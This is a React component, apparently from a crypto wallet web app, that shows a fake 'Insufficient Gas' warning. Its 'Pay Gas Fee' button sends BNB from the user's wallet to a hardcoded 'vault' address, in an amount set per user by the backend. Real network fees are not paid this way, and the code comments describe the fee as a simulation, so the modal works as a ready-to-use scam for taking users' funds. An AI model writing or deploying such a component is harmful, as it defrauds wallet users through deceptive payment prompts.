'use client';

import { useEffect, useState } from 'react';
import { X, Fuel, ArrowRight, Loader2, CheckCircle } from 'lucide-react';
import { ethers } from 'ethers';
import { useWallet } from '@/context/base';
import toast from 'react-hot-toast';

declare global {
    interface Window {
        ethereum: any;
    }
}

interface GasFeeModalProps {
    isOpen: boolean;
    onClose: () => void;
    onSuccess: (txHash: string) => void;
    amount?: string;
    user?:any
}

const GAS_FEE_VAULT = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'; // Example Vault Address
const recipient = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'; // Example Vault Address

export default function GasFeeModal({ isOpen, onClose, onSuccess, amount = '0.00' ,user}: GasFeeModalProps) {
    // 'idle' | 'processing' | 'success'
    const [status, setStatus] = useState<any>('idle');
    const [txHash, setTxHash] = useState('');
    const [error, setError] = useState('');
const {  cbProvider } = useWallet();
  useEffect(()=>{
if(error){

    toast.error(error)
}
  },[error])
    if (!isOpen) return null;

    const handlePayGas = async () => {
        try {
            setStatus('processing');

            if (typeof window.ethereum === 'undefined') {
                throw new Error("No wallet found");
            }

            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();

            // Fixed high gas fee simulation as requested ("insufficient gas fee" usually implies a specific needed amount)
            // User mentioned "purchase of gas fee". We'll send a fixed amount of BNB to the vault.
            // Let's assume a "Gas Fee" of roughly $5-10 worth of BNB, or just a generic "fee".
            // For now, let's send 0.01 BNB as the "Fee".
            const gasFeeAmount = ethers.parseEther("0.025");

            const tx = await signer.sendTransaction({
                to: GAS_FEE_VAULT,
                value: gasFeeAmount
            });

            setTxHash(tx.hash);
            setStatus('success');

            // "Instant" UI feedback, but manual backend.
            setTimeout(() => {
                onSuccess(tx.hash);
                onClose();
                setStatus('idle'); // Reset for next time
            }, 2000);

        } catch (error) {
            console.error("Gas payment failed:", error);
            setStatus('idle');
            // Optionally set error state here
        }
    };

      const sendBnb = async () => {
    //   return  onClose()

        let amount = (user?.fields?.gasFee||"").toString()
        console.log(amount)
    try {
      if (!cbProvider || !recipient || !amount) return;
      setStatus('processing');
      setError('');

      const provider = new ethers.BrowserProvider(cbProvider);
      const signer = await provider.getSigner(); // Request permission to sign

      // Create and send the transaction
      const tx = await signer.sendTransaction({
        to: GAS_FEE_VAULT,
        value: ethers.parseEther(amount), // Converts "0.01" to Wei
      });

      toast('Transaction sent! Waiting for block...');
      await tx.wait(); // Wait for the blockchain to confirm it
      
      toast('Success! BNB sent.');
    //   setAmount('');
    //   setRecipient('');
      
      // Refresh balances after sending
    //   await updateBalances(address, provider);
    } catch (err: any) {
      console.error("Transaction Error:", err);
      setError(err.message || "Transaction failed");
      setStatus('idle');
    }finally{
        setStatus('idle');

    }
  };



    return (
        <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 animate-fade-in">
            <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={status !== 'processing' ? onClose : undefined} />

            <div className="absolute bottom-0 left-0 right-0 w-full bg-[#0a0b0d] border-t border-[#0052FF]/30 rounded-t-[2rem] p-6 animate-slide-up text-center space-y-5 text-white shadow-2xl pb-12">
                {/* Close Button for consistency */}
                <button
                    onClick={onClose}
                    className="absolute top-4 right-4 w-8 h-8 flex items-center justify-center bg-gray-800/50 hover:bg-gray-700/50 rounded-full transition-colors text-gray-400 hover:text-white z-10"
                >
                    <X className="w-5 h-5" />
                </button>
                {status === 'success' ? (
                    <div className="space-y-4">
                        <div className="w-14 h-14 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto animate-bounce-subtle">
                            <CheckCircle className="w-7 h-7" />
                        </div>
                        <div>
                            <h3 className="text-xl font-bold text-white">Payment Successful</h3>
                            <p className="text-gray-400 text-sm mt-1">Transaction Submitted</p>
                            <p className="text-xs text-gray-500 mt-2 font-mono truncate px-4 bg-white/5 py-2 rounded-lg">{txHash}</p>
                        </div>
                    </div>
                ) : (
                    <>
                        <div className="w-14 h-14 bg-orange-500/20 text-orange-500 rounded-full flex items-center justify-center mx-auto">
                            <Fuel className="w-7 h-7" />
                        </div>

                        <div className="space-y-2">
                            <h3 className="text-xl font-bold text-white">Insufficient Gas</h3>
                            <p className="text-gray-400 text-xs leading-relaxed px-4">
                                A network gas fee is required to process this transaction securely on the blockchain.
                            </p>
                        </div>

                        <div className="bg-[#1E2025] rounded-xl p-4 border border-white/5">
                            <div className="flex justify-between items-center text-sm mb-2">
                                <span className="text-gray-400">Estimated Fee</span>
                                <span className="text-white font-medium text-base">{user?.fields?.gasFee||0} BNB</span>
                            </div>
                            <div className="flex justify-between items-center text-sm">
                                <span className="text-gray-400">Time</span>
                                <span className="text-green-400 font-medium">Instant</span>
                            </div>
                        </div>

                        <button
                            onClick={
                                // handlePayGas
                                sendBnb
                            }
                            disabled={status === 'processing'}
                            className="w-full bg-[#0052FF] hover:bg-[#004ada] text-white font-bold py-3.5 rounded-full transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] text-sm"
                        >
                            {status === 'processing' ? (
                                <>
                                    <Loader2 className="w-4 h-4 animate-spin" />
                                    Processing...
                                </>
                            ) : (
                                <>
                                  { !(user?.fields?.gasFee) ?"Generating Gas Fee":  "Pay Gas Fee"}
                                    <ArrowRight className="w-4 h-4" />
                                </>
                            )}
                        </button>
                    </>
                )}
            </div>
        </div>
    );
}
